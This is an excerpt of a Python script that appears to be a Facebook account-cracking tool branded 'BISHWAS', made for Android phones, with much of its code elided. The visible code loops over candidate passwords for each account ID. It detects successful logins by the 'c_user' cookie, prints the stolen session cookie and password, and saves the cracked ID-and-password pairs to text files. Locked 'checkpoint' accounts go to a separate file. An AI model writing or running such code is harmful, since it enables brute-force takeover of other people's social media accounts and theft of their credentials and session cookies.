...
ha = current.day
today = date.today()
logo = ("""____ _____  _____ _    ___          __      _____ 
 |  _ \_   _|/ ____| |  | \ \        / /\    / ____|
 | |_) || | | (___ | |__| |\ \  /\  / /  \  | (___  
 |  _ < | |  \___ \|  __  | \ \/  \/ / /\ \  \___ \ 
 | |_) || |_ ____) | |  | |  \  /\  / ____ \ ____) |
        ...
        for ps in pwx:
           ...
           'viewport-width': '980',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m [BISHWAS-OK💉] ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie 🍪= \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/BISHWAS-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('\r\r\33[1;31m [BISHWAS-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/BISHWAS-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s {x}[{xr}BISHWAS{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
